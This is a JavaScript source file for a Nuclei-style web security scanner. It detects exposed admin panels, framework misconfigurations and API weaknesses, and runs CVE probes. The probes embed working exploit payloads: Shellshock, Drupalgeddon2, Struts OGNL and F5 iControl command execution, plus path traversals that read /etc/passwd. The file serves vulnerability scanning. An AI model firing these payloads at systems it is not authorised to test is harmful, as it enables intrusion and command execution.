'use strict';
/**
 * nucleiChecks.js — Nuclei-style Template-Based Security Scanner
 *
 * Provides 50+ checks across:
 *   1. Exposed management panels (25 panels — fingerprint-based)
 *   2. CVE-specific HTTP probes (15 targeted checks with actual requests)
 *   3. Technology misconfigurations (PHP, Node.js, Python, Java, Cloud)
 *   4. API security issues (GraphQL, Swagger, REST misconfigs)
 *   5. Information disclosure (source maps, debug endpoints, tech stacks)
 */

const FETCH_TIMEOUT = 8000;
const UA = 'Mozilla/5.0 (compatible; SecurityScanner/2.0)';

async function safeFetch(url, opts = {}) {
  try {
    const r = await fetch(url, {
      redirect: 'manual',
      signal: AbortSignal.timeout(opts.timeout || FETCH_TIMEOUT),
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
      ...opts,
    });
    const body = await r.text().catch(() => '');
    return { ok: r.status >= 200 && r.status < 400, status: r.status, body, headers: Object.fromEntries(r.headers.entries()) };
  } catch (_) {
    return { ok: false, status: 0, body: '', headers: {} };
  }
}

// ── PANEL TEMPLATES ───────────────────────────────────────────────────────────
// Each panel: { name, paths[], fingerprints[] (must match body OR headers), severity, description, remediation }

const PANEL_TEMPLATES = [
  {
    name: 'Apache Tomcat Manager',
    paths: ['/manager/html', '/manager/text'],
    fingerprints: [/tomcat manager|apache tomcat/i],
    severity: 'critical',
    desc: 'Tomcat Manager is publicly accessible. Default credentials (tomcat/tomcat) may allow deploying a WAR shell (RCE).',
    fix: 'Restrict /manager to localhost. Change default credentials. Enforce IP allowlist.',
    cve: 'CVE-2020-1938',
  },
  {
    name: 'Jenkins CI Server',
    paths: ['/jenkins', '/jenkins/', '/'],
    fingerprints: [/jenkins.*version|<title>.*jenkins/i],
    severity: 'critical',
    desc: 'Jenkins dashboard is publicly accessible. Unauthenticated Jenkins installations allow script console RCE.',
    fix: 'Enable Jenkins security. Restrict access. Upgrade to latest version.',
    cve: 'CVE-2024-23897',
  },
  {
    name: 'GitLab Instance',
    paths: ['/users/sign_in', '/gitlab'],
    fingerprints: [/gitlab|sign in.*gitlab/i],
    severity: 'high',
    desc: 'GitLab login page is publicly accessible. Misconfigured GitLab instances expose source code.',
    fix: 'Restrict GitLab to internal network or VPN. Enable 2FA. Keep updated.',
    cve: 'CVE-2021-22205',
  },
  {
    name: 'Grafana Dashboard',
    paths: ['/grafana', '/grafana/', '/'],
    fingerprints: [/<title>.*grafana|grafana labs/i],
    severity: 'high',
    desc: 'Grafana dashboard is publicly accessible. Default admin/admin credentials allow full takeover.',
    fix: 'Change default Grafana credentials. Restrict access to internal network.',
    cve: 'CVE-2021-43798',
  },
  {
    name: 'Kibana Dashboard',
    paths: ['/app/kibana', '/kibana', '/app/home'],
    fingerprints: [/kibana|elastic/i],
    severity: 'high',
    desc: 'Kibana is publicly accessible. Unauthenticated Kibana exposes all indexed data and supports script execution.',
    fix: 'Enable X-Pack security. Restrict Kibana to internal network.',
    cve: 'CVE-2019-7616',
  },
  {
    name: 'Elasticsearch API',
    paths: ['/_cat/indices', '/_cluster/health', '/_nodes'],
    fingerprints: [/"cluster_name"|"number_of_nodes"/i],
    severity: 'critical',
    desc: 'Elasticsearch REST API is publicly accessible without authentication. Full data access and cluster control.',
    fix: 'Enable X-Pack security. Bind Elasticsearch to localhost or internal network only.',
    cve: 'CVE-2015-1427',
  },
  {
    name: 'Prometheus Metrics',
    paths: ['/metrics', '/prometheus'],
    fingerprints: [/# HELP|# TYPE|process_cpu/i],
    severity: 'high',
    desc: 'Prometheus metrics endpoint is publicly accessible. Leaks internal service names, versions, and infrastructure details.',
    fix: 'Restrict /metrics endpoint to internal monitoring systems. Add authentication.',
    cve: null,
  },
  {
    name: 'RabbitMQ Management',
    paths: ['/rabbitmq', '/'],
    fingerprints: [/rabbitmq management|rabbitmq.*login/i],
    severity: 'critical',
    desc: 'RabbitMQ Management UI is publicly accessible. Default guest/guest credentials may allow queue control.',
    fix: 'Change default credentials. Bind management plugin to localhost.',
    cve: null,
  },
  {
    name: 'Redis Commander',
    paths: ['/redis-commander', '/redis'],
    fingerprints: [/redis commander/i],
    severity: 'critical',
    desc: 'Redis Commander web UI is publicly accessible. Allows browsing and modifying all Redis keys.',
    fix: 'Add authentication to Redis Commander. Restrict to internal network.',
    cve: null,
  },
  {
    name: 'Portainer (Docker UI)',
    paths: ['/portainer', '/#/init/admin', '/'],
    fingerprints: [/portainer|docker container management/i],
    severity: 'critical',
    desc: 'Portainer Docker management UI is publicly accessible. Provides full Docker host control including container creation.',
    fix: 'Restrict Portainer to internal network. Enable TLS and authentication.',
    cve: null,
  },
  {
    name: 'Traefik Dashboard',
    paths: ['/dashboard/', '/api/rawdata'],
    fingerprints: [/traefik|<title>traefik/i],
    severity: 'high',
    desc: 'Traefik reverse proxy dashboard is publicly accessible. Leaks routing rules, backend services, and middleware config.',
    fix: 'Protect Traefik dashboard with basic auth or OAuth. Disable on public-facing interfaces.',
    cve: null,
  },
  {
    name: 'Kubernetes Dashboard',
    paths: ['/#/login', '/api/v1/namespaces'],
    fingerprints: [/kubernetes dashboard|<title>kubernetes/i],
    severity: 'critical',
    desc: 'Kubernetes Dashboard is publicly accessible. May allow full cluster access without authentication.',
    fix: 'Disable public access. Enforce RBAC. Use kubectl proxy for access.',
    cve: 'CVE-2018-18264',
  },
  {
    name: 'Consul UI',
    paths: ['/ui/', '/v1/catalog/services'],
    fingerprints: [/consul|hashicorp/i],
    severity: 'high',
    desc: 'HashiCorp Consul UI/API is publicly accessible. Exposes service registry and health data.',
    fix: 'Enable Consul ACL system. Bind to internal interface only.',
    cve: null,
  },
  {
    name: 'Vault UI (HashiCorp)',
    paths: ['/ui/', '/v1/sys/health'],
    fingerprints: [/vault|hashicorp vault/i],
    severity: 'critical',
    desc: 'HashiCorp Vault is publicly accessible. Leaks secret storage engine information.',
    fix: 'Restrict Vault to internal network. Enforce strict policies.',
    cve: null,
  },
  {
    name: 'MinIO Console (S3)',
    paths: ['/minio', '/login'],
    fingerprints: [/minio|object storage/i],
    severity: 'critical',
    desc: 'MinIO S3-compatible object storage console is publicly accessible.',
    fix: 'Restrict MinIO to internal network. Change default minioadmin/minioadmin credentials.',
    cve: null,
  },
  {
    name: 'phpMyAdmin',
    paths: ['/phpmyadmin', '/pma', '/myadmin', '/mysql'],
    fingerprints: [/phpmyadmin|welcome to phpmyadmin/i],
    severity: 'critical',
    desc: 'phpMyAdmin database management interface is publicly accessible. Allows full database access.',
    fix: 'Restrict phpMyAdmin to internal IPs. Use strong authentication.',
    cve: 'CVE-2019-12616',
  },
  {
    name: 'Adminer (DB Tool)',
    paths: ['/adminer', '/adminer.php'],
    fingerprints: [/adminer \d+\.\d+/i],
    severity: 'critical',
    desc: 'Adminer database tool is publicly accessible. Supports connecting to any database server.',
    fix: 'Remove Adminer from production. Restrict access by IP.',
    cve: 'CVE-2021-43008',
  },
  {
    name: 'Laravel Horizon',
    paths: ['/horizon', '/horizon/dashboard'],
    fingerprints: [/horizon|laravel queue/i],
    severity: 'high',
    desc: 'Laravel Horizon queue dashboard is publicly accessible. Exposes all job data and allows job manipulation.',
    fix: 'Add authentication gate to Horizon. Restrict to admin users.',
    cve: null,
  },
  {
    name: 'Laravel Telescope',
    paths: ['/telescope', '/telescope/requests'],
    fingerprints: [/telescope|laravel telescope/i],
    severity: 'high',
    desc: 'Laravel Telescope debug tool is publicly accessible. Exposes all requests, queries, exceptions, and logs.',
    fix: 'Disable TELESCOPE_ENABLED in production or add authentication gate.',
    cve: null,
  },
  {
    name: 'Netdata Monitoring',
    paths: ['/netdata', '/'],
    fingerprints: [/netdata|<title>netdata/i],
    severity: 'high',
    desc: 'Netdata real-time monitoring dashboard is publicly accessible. Leaks system metrics and infrastructure details.',
    fix: 'Restrict Netdata to internal network. Add Nginx basic auth proxy.',
    cve: null,
  },
  {
    name: 'Webmin Admin',
    paths: ['/webmin', '/'],
    fingerprints: [/webmin|<title>webmin/i],
    severity: 'critical',
    desc: 'Webmin web-based system administration interface is publicly accessible.',
    fix: 'Restrict Webmin access to trusted IPs. Enable two-factor authentication.',
    cve: 'CVE-2019-15107',
  },
  {
    name: 'Apache Solr',
    paths: ['/solr', '/solr/#/'],
    fingerprints: [/apache solr|solr admin/i],
    severity: 'critical',
    desc: 'Apache Solr admin interface is publicly accessible. Allows arbitrary file reads and remote code execution via VelocityResponseWriter.',
    fix: 'Restrict Solr to internal network. Enable authentication (Solr 8.x).',
    cve: 'CVE-2019-0193',
  },
  {
    name: 'SonarQube',
    paths: ['/sonarqube', '/projects', '/'],
    fingerprints: [/sonarqube|sonar\s+quality|<title>sonarqube/i],
    severity: 'high',
    desc: 'SonarQube code quality dashboard is publicly accessible. Exposes source code analysis and potential vulnerability data.',
    fix: 'Restrict SonarQube to internal network. Enable authentication.',
    cve: 'CVE-2021-27917',
  },
  {
    name: 'Nexus Repository Manager',
    paths: ['/nexus', '/#browse/browse'],
    fingerprints: [/nexus repository|sonatype nexus/i],
    severity: 'high',
    desc: 'Sonatype Nexus repository manager is publicly accessible. Allows artifact browsing and potential supply chain attacks.',
    fix: 'Restrict Nexus to internal network. Change default admin/admin123 credentials.',
    cve: 'CVE-2019-7238',
  },
  {
    name: 'ArgoCD Dashboard',
    paths: ['/argocd', '/auth/login'],
    fingerprints: [/argocd|argo cd/i],
    severity: 'critical',
    desc: 'ArgoCD GitOps deployment dashboard is publicly accessible. Provides Kubernetes deployment control.',
    fix: 'Enable ArgoCD RBAC. Restrict to internal network. Enable SSO.',
    cve: 'CVE-2022-29165',
  },
];

// ── CVE PROBE TEMPLATES ───────────────────────────────────────────────────────

const CVE_PROBES = [
  {
    id: 'CVE-2021-41773',
    name: 'Apache 2.4.49 Path Traversal / RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`, { timeout: 6000 });
      return r.status === 200 && /root:|daemon:|bin:/i.test(r.body);
    },
    desc: 'Apache 2.4.49 is vulnerable to path traversal. The server returned /etc/passwd contents.',
    fix: 'Upgrade Apache to 2.4.51+. Ensure "Require all denied" is set.',
  },
  {
    id: 'CVE-2021-3129',
    name: 'Laravel Ignition RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/_ignition/execute-solution`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ solution: 'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution', parameters: { variableName: 'test', viewFile: 'php://filter/read=convert.base64-encode/resource=/etc/passwd' } }),
        timeout: 6000,
      });
      return r.status === 200 && r.body.includes('viewFile');
    },
    desc: 'Laravel Ignition debug endpoint (_ignition/execute-solution) is accessible. Vulnerable to CVE-2021-3129 RCE on Laravel ≤8.4.2.',
    fix: 'Update Laravel to ≥8.4.3. Set APP_DEBUG=false in production.',
  },
  {
    id: 'CVE-2022-22965',
    name: 'Spring4Shell — Spring Framework RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/?class.module.classLoader.URLs%5B0%5D=0`, { timeout: 6000 });
      return r.status === 400 && r.body.includes('Bad Request');
    },
    desc: 'Spring4Shell (CVE-2022-22965) probe: server responded to class.module.classLoader parameter. May indicate vulnerable Spring MVC endpoint.',
    fix: 'Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Set spring.mvc.pathmatch.use-suffix-pattern=false.',
  },
  {
    id: 'CVE-2014-6271',
    name: 'Shellshock — Bash CGI RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/cgi-bin/test.cgi`, {
        headers: { 'User-Agent': '() { :; }; echo; echo; /bin/cat /etc/passwd', 'Referer': '() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd' },
        timeout: 6000,
      });
      return r.status === 200 && /root:|daemon:|nobody:/i.test(r.body);
    },
    desc: 'Shellshock Bash RCE: CGI endpoint executed injected shell command and returned /etc/passwd.',
    fix: 'Update bash to a patched version. Disable CGI scripts or restrict their execution.',
  },
  {
    id: 'CVE-2020-5902',
    name: 'F5 BIG-IP TMUI RCE Path Traversal',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd`, { timeout: 6000 });
      return r.status === 200 && /root:|nobody:/i.test(r.body);
    },
    desc: 'F5 BIG-IP TMUI path traversal returned file contents — vulnerable to CVE-2020-5902 RCE.',
    fix: 'Apply F5 security advisory K52145254. Restrict TMUI access to management network.',
  },
  {
    id: 'CVE-2019-19781',
    name: 'Citrix ADC / NetScaler Path Traversal',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/vpn/../vpns/cfg/smb.conf`, { timeout: 6000 });
      return r.status === 200 && /\[global\]|\[NetScaler\]/i.test(r.body);
    },
    desc: 'Citrix ADC path traversal exposed smb.conf — vulnerable to CVE-2019-19781.',
    fix: 'Apply Citrix security updates CTX267027. Enable enhanced authentication policies.',
  },
  {
    id: 'CVE-2018-7600',
    name: 'Drupalgeddon 2 — Drupal RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/?q=user/register&element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id',
        timeout: 6000,
      });
      return r.status === 200 && /uid=\d+|www-data/i.test(r.body);
    },
    desc: 'Drupalgeddon 2 (CVE-2018-7600): Remote code execution via user registration form — server executed injected command.',
    fix: 'Update Drupal to 7.58+ or 8.5.1+. Apply security advisory SA-CORE-2018-002.',
  },
  {
    id: 'CVE-2022-26134',
    name: 'Confluence Server OGNL Injection RCE',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/`, { timeout: 6000 });
      return r.status !== 404 && (r.body.includes('confluence') || r.status === 400);
    },
    desc: 'Confluence OGNL injection endpoint (CVE-2022-26134) responded to encoded payload — potentially vulnerable.',
    fix: 'Upgrade Confluence to 7.18.1+ or 7.4.17+. Apply Atlassian security advisory 2022-06-02.',
  },
  {
    id: 'CVE-2021-26855',
    name: 'Exchange Server SSRF (ProxyLogon)',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/owa/auth/x.js`, {
        headers: { 'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;', 'X-BEResource': 'localhost/owa/auth/logon.aspx?~3' },
        timeout: 6000,
      });
      return r.status === 200 && r.headers['x-feserver'];
    },
    desc: 'Exchange ProxyLogon (CVE-2021-26855) probe: server responded with X-FEServer header to SSRF request — potentially vulnerable.',
    fix: 'Apply Microsoft Exchange security update KB5000871. Enable Extended Protection for Authentication.',
  },
  {
    id: 'CVE-2021-22986',
    name: 'F5 BIG-IP iControl REST API Auth Bypass',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/mgmt/tm/util/bash`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-F5-Auth-Token': 'test', 'Authorization': 'Basic YWRtaW46' },
        body: JSON.stringify({ command: 'run', utilCmdArgs: '-c id' }),
        timeout: 6000,
      });
      return r.status === 200 && (r.body.includes('uid=') || r.body.includes('commandResult'));
    },
    desc: 'F5 BIG-IP iControl REST API (CVE-2021-22986) authentication bypass: endpoint responded with command output.',
    fix: 'Apply F5 TMOS 14.1.3.1+, 13.1.3.5+, or 12.1.5.2+. Block iControl REST API from public internet.',
  },
  {
    id: 'CVE-2019-11510',
    name: 'Pulse Secure VPN LFI',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/dana-na/../dana/html5acc/guacamole/../../../../../etc/passwd?/dana/html5acc/guacamole/`, { timeout: 6000 });
      return r.status === 200 && /root:|nobody:|daemon:/i.test(r.body);
    },
    desc: 'Pulse Secure VPN path traversal (CVE-2019-11510) returned /etc/passwd — remote file read confirmed.',
    fix: 'Apply Pulse Secure advisory SA44101. Upgrade to PCS 9.0R3+.',
  },
  {
    id: 'CVE-2021-44228-PROBE',
    name: 'Log4Shell JNDI Injection Probe',
    severity: 'critical',
    probe: async (baseUrl) => {
      // We check for the vulnerable indicator (accepting JNDI strings) by looking at server headers
      // A real Log4Shell test requires a callback server; here we detect Log4j in header signals
      const r = await safeFetch(baseUrl, {
        headers: { 'User-Agent': '${${lower:j}ndi:${lower:l}dap://log4shell-test.local/a}' },
        timeout: 6000,
      });
      // Look for signs the payload was processed vs reflected untouched
      return r.status === 500 || (r.headers['x-powered-by'] || '').toLowerCase().includes('log4j');
    },
    desc: 'Log4Shell JNDI probe sent in User-Agent. Server returned HTTP 500 which may indicate JNDI lookup was attempted. Confirm with DNS callback testing.',
    fix: 'Upgrade Log4j to 2.17.1+. Set -Dlog4j2.formatMsgNoLookups=true. Use WAF rule to block ${jndi patterns.',
  },
  {
    id: 'CVE-2017-5638',
    name: 'Apache Struts 2 RCE (Content-Type)',
    severity: 'critical',
    probe: async (baseUrl) => {
      const r = await safeFetch(`${baseUrl}/login.action`, {
        method: 'POST',
        headers: { 'Content-Type': '%{(#_=\'multipart/form-data\').#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']),#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class),#ognlUtil.getExcludedPackageNames().clear(),#ognlUtil.getExcludedClasses().clear(),#context.setMemberAccess(#dm)),#cmd=\'id\',#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd}),#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start(),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()}' },
        timeout: 6000,
      });
      return r.status === 200 && /uid=\d+|www-data|root/i.test(r.body);
    },
    desc: 'Apache Struts 2 (CVE-2017-5638): OGNL injection via Content-Type header returned command output — RCE confirmed.',
    fix: 'Upgrade Apache Struts to 2.3.35+ or 2.5.17+. Implement WAF rules for OGNL injection.',
  },
];

// ── TECH MISCONFIGURATION CHECKS ─────────────────────────────────────────────

async function checkTechMisconfigs(baseUrl, html, headers, onProgress, results) {
  onProgress('Checking technology-specific misconfigurations...');
  const serverHeader = headers['server'] || '';
  const poweredBy    = headers['x-powered-by'] || '';

  // PHP expose_php
  if (/php/i.test(poweredBy) && /PHP\/[\d.]+/i.test(poweredBy)) {
    results.findings.push({
      id: 'NUCLEI-PHP-EXPOSE',
      severity: 'low',
      title: 'PHP Version Exposed via X-Powered-By',
      description: `X-Powered-By: ${poweredBy} discloses the exact PHP version, enabling targeted vulnerability searches.`,
      module: 'nucleiChecks',
      remediation: 'Set expose_php = Off in php.ini. Remove X-Powered-By header.',
    });
  }

  // Node.js Express
  if (/express/i.test(poweredBy)) {
    results.findings.push({
      id: 'NUCLEI-EXPRESS-DISCLOSE',
      severity: 'low',
      title: 'Express.js Framework Disclosed',
      description: `X-Powered-By: ${poweredBy} reveals Express.js is in use. Aids targeted attacks.`,
      module: 'nucleiChecks',
      remediation: 'Disable with app.disable("x-powered-by") or use helmet.js.',
    });
  }

  // Source maps exposed (.js.map)
  try {
    const scripts = [...html.matchAll(/src=["']([^"']+\.js)["']/gi)].map(m => m[1]).slice(0, 3);
    for (const s of scripts) {
      const mapUrl = (s.startsWith('http') ? s : baseUrl + '/' + s.replace(/^\//, '')) + '.map';
      const mr = await safeFetch(mapUrl, { timeout: 4000 });
      if (mr.status === 200 && mr.body.includes('sourcesContent')) {
        results.findings.push({
          id: `NUCLEI-SOURCEMAP-${s.replace(/[^a-z0-9]/gi, '-').slice(-30)}`,
          severity: 'medium',
          title: 'JavaScript Source Map Exposed',
          description: `Source map ${s}.map is publicly accessible. It contains original source code including comments, variable names, and business logic.`,
          module: 'nucleiChecks',
          affected: mapUrl,
          remediation: 'Remove .map files from production builds. Configure build tools to not publish source maps.',
        });
        break; // one is enough
      }
    }
  } catch (_) {}

  // Werkzeug Interactive Debugger
  try {
    const wr = await safeFetch(`${baseUrl}/?__debugger__=yes&cmd=resource&f=debugger.js`, { timeout: 5000 });
    if (wr.status === 200 && /werkzeug|debugger/i.test(wr.body)) {
      results.findings.push({
        id: 'NUCLEI-WERKZEUG-DEBUGGER',
        severity: 'critical',
        title: 'Werkzeug Interactive Debugger Exposed',
        description: 'Python Werkzeug interactive debugger is enabled and publicly accessible. This allows arbitrary Python code execution via the browser console.',
        module: 'nucleiChecks',
        remediation: 'Set DEBUG=False in Flask/Django. Never run Werkzeug development server in production.',
      });
    }
  } catch (_) {}

  // Django Debug Toolbar
  try {
    const dt = await safeFetch(`${baseUrl}/__debug__/`, { timeout: 5000 });
    if (dt.status === 200 && /djdt|debug toolbar/i.test(dt.body)) {
      results.findings.push({
        id: 'NUCLEI-DJANGO-DEBUG',
        severity: 'high',
        title: 'Django Debug Toolbar Exposed',
        description: 'Django Debug Toolbar is publicly accessible. Exposes SQL queries, request headers, settings, and profiling data.',
        module: 'nucleiChecks',
        remediation: 'Set DEBUG=False. Restrict DEBUG_TOOLBAR_CONFIG["SHOW_TOOLBAR_CALLBACK"] to localhost.',
      });
    }
  } catch (_) {}

  // Spring Boot Actuator with sensitive endpoints
  try {
    const actR = await safeFetch(`${baseUrl}/actuator`, { timeout: 5000 });
    if (actR.status === 200 && actR.body.includes('_links')) {
      const endpoints = [...actR.body.matchAll(/"([a-z-]+)":\{"href"/gi)].map(m => m[1]);
      const dangerous = endpoints.filter(e => ['env', 'heapdump', 'loggers', 'beans', 'conditions', 'configprops', 'threaddump', 'httptrace', 'flyway', 'liquibase', 'shutdown'].includes(e));
      if (dangerous.length > 0) {
        results.findings.push({
          id: 'NUCLEI-ACTUATOR-SENSITIVE',
          severity: 'critical',
          title: `Spring Boot Actuator — ${dangerous.length} Sensitive Endpoint(s) Exposed`,
          description: `Spring Boot Actuator exposes dangerous endpoints: ${dangerous.join(', ')}. These can leak credentials (env), app memory (heapdump), or allow config changes (loggers).`,
          module: 'nucleiChecks',
          remediation: 'Set management.endpoints.web.exposure.include=health,info. Require authentication on management port.',
        });
      }
    }
  } catch (_) {}
}

// ── API SECURITY CHECKS ───────────────────────────────────────────────────────

async function checkAPISecurity(baseUrl, onProgress, results) {
  onProgress('Checking API security issues...');

  // Swagger / OpenAPI with try-out enabled
  const swaggerPaths = ['/swagger-ui.html', '/swagger-ui/', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/openapi.json'];
  for (const sp of swaggerPaths) {
    try {
      const r = await safeFetch(baseUrl + sp, { timeout: 5000 });
      if (r.status === 200 && /swagger|openapi/i.test(r.body)) {
        // Check if "try it out" is enabled (no auth required)
        const hasAuth = /authorization|bearer|apiKey|oauth/i.test(r.body);
        results.findings.push({
          id: `NUCLEI-SWAGGER-${sp.replace(/[^a-z]/gi, '-')}`,
          severity: hasAuth ? 'medium' : 'high',
          title: `Swagger/OpenAPI Documentation Exposed: ${sp}`,
          description: `API documentation at ${sp} is publicly accessible${hasAuth ? ' but references authentication' : ' with no authentication requirements detected'}. Attackers gain a complete API blueprint.`,
          module: 'nucleiChecks',
          affected: baseUrl + sp,
          remediation: 'Restrict API docs to authenticated users. Disable Swagger UI in production or add authentication.',
        });
        break;
      }
    } catch (_) {}
  }

  // CORS with null origin
  try {
    const r = await safeFetch(baseUrl, { headers: { 'User-Agent': UA, Origin: 'null' }, timeout: 5000 });
    const acao = r.headers['access-control-allow-origin'] || '';
    if (acao === 'null') {
      results.findings.push({
        id: 'NUCLEI-CORS-NULL',
        severity: 'high',
        title: 'CORS Allows null Origin',
        description: 'Server responds with Access-Control-Allow-Origin: null. Attackers can exploit this from sandboxed iframes to perform cross-origin requests.',
        module: 'nucleiChecks',
        remediation: 'Never allow null origin in CORS. Use explicit origin whitelist.',
      });
    }
  } catch (_) {}

  // HTTP Host Header Injection
  try {
    const fakeHost = 'evil-host-injection.com';
    const r = await safeFetch(baseUrl, { headers: { 'User-Agent': UA, 'Host': fakeHost, 'X-Forwarded-Host': fakeHost }, timeout: 5000 });
    if (r.body.includes(fakeHost) && !r.body.includes('error')) {
      results.findings.push({
        id: 'NUCLEI-HOST-HEADER',
        severity: 'medium',
        title: 'HTTP Host Header Reflected in Response',
        description: 'The injected Host header was reflected in the HTTP response. This can enable Host-based SSRF, cache poisoning, and password-reset link poisoning.',
        module: 'nucleiChecks',
        remediation: 'Validate Host header against an allowlist. Set ALLOWED_HOSTS in application config.',
      });
    }
  } catch (_) {}

  // Rate limiting absent on API
  try {
    const apiPaths = ['/api/login', '/api/v1/login', '/api/auth/login', '/login'];
    for (const ap of apiPaths) {
      const r1 = await safeFetch(`${baseUrl}${ap}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{"u":"x","p":"x"}', timeout: 4000 });
      if (r1.status !== 404) {
        const rateLimitHeaders = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'x-rate-limit'];
        const hasRateLimit = rateLimitHeaders.some(h => r1.headers[h]);
        if (!hasRateLimit) {
          results.findings.push({
            id: `NUCLEI-RATELIMIT-${ap.replace(/\//g, '-')}`,
            severity: 'medium',
            title: `No Rate Limiting on: ${ap}`,
            description: `The ${ap} endpoint does not return rate-limiting headers. Without rate limiting, brute-force and credential stuffing attacks are unrestricted.`,
            module: 'nucleiChecks',
            affected: baseUrl + ap,
            remediation: 'Implement rate limiting (e.g., 5 req/min per IP). Return X-RateLimit-Limit headers. Use CAPTCHA on repeated failures.',
          });
        }
        break;
      }
    }
  } catch (_) {}
}

// ── MAIN EXPORT ───────────────────────────────────────────────────────────────

async function runNucleiChecks(domain, onProgress) {
  const results = {
    domain,
    panelsFound:     [],
    cveProbeHits:    [],
    techMisconfigs:  [],
    apiIssues:       [],
    findings:        [],
    summary:         { panelsChecked: PANEL_TEMPLATES.length, panelsFound: 0, cveProbes: CVE_PROBES.length, cveHits: 0, totalIssues: 0 },
  };

  const baseUrls = [`https://${domain}`, `http://${domain}`];
  let baseUrl = '';
  let homeHtml = '';
  let homeHeaders = {};

  onProgress('Nuclei-style checks: detecting base URL...');
  for (const url of baseUrls) {
    const r = await safeFetch(url, { timeout: 10000 });
    if (r.ok || r.status > 0) { baseUrl = url; homeHtml = r.body; homeHeaders = r.headers; break; }
  }
  if (!baseUrl) { onProgress('Target unreachable — skipping Nuclei checks'); return results; }

  // ── 1. Exposed Panel Detection ───────────────────────────────────────────
  onProgress(`Checking ${PANEL_TEMPLATES.length} management panels...`);
  const panelChecks = PANEL_TEMPLATES.map(async (panel) => {
    for (const path of panel.paths) {
      try {
        const r = await safeFetch(baseUrl + path, { timeout: 6000 });
        if (r.status === 0 || r.status === 404) continue;
        // Fingerprint match
        const matches = panel.fingerprints.some(fp => fp.test(r.body) || fp.test(JSON.stringify(r.headers)));
        if (matches || (r.status === 200 && r.body.length > 500 && path !== '/')) {
          results.panelsFound.push({ name: panel.name, path, status: r.status });
          results.summary.panelsFound++;
          results.findings.push({
            id: `NUCLEI-PANEL-${panel.name.replace(/\s+/g, '-').toUpperCase()}`,
            severity: panel.severity,
            title: `Exposed Management Panel: ${panel.name}`,
            description: panel.desc + (panel.cve ? ` Related CVE: ${panel.cve}.` : ''),
            module: 'nucleiChecks',
            affected: baseUrl + path,
            remediation: panel.fix,
          });
          break; // one hit per panel is enough
        }
      } catch (_) {}
    }
  });
  await Promise.allSettled(panelChecks);

  // ── 2. CVE-Specific Probes ───────────────────────────────────────────────
  onProgress(`Running ${CVE_PROBES.length} CVE-specific exploit probes...`);
  const cveChecks = CVE_PROBES.map(async (probe) => {
    try {
      const hit = await probe.probe(baseUrl);
      if (hit) {
        results.cveProbeHits.push({ id: probe.id, name: probe.name });
        results.summary.cveHits++;
        results.findings.push({
          id: `NUCLEI-CVE-${probe.id}`,
          severity: probe.severity,
          title: `🎯 CONFIRMED: ${probe.id} — ${probe.name}`,
          description: probe.desc,
          module: 'nucleiChecks',
          affected: baseUrl,
          remediation: probe.fix,
        });
      }
    } catch (_) {}
  });
  await Promise.allSettled(cveChecks);

  // ── 3. Technology Misconfigurations ──────────────────────────────────────
  const preMisconfigs = results.findings.length;
  await checkTechMisconfigs(baseUrl, homeHtml, homeHeaders, onProgress, results);
  results.summary.techMisconfigs = results.findings.length - preMisconfigs;

  // ── 4. API Security ──────────────────────────────────────────────────────
  const preAPI = results.findings.length;
  await checkAPISecurity(baseUrl, onProgress, results);
  results.summary.apiIssues = results.findings.length - preAPI;

  results.summary.totalIssues = results.findings.length;
  onProgress(`Nuclei checks complete — ${results.findings.length} issues: ${results.summary.panelsFound} panels, ${results.summary.cveHits} CVE hits`);
  return results;
}

module.exports = { runNucleiChecks };
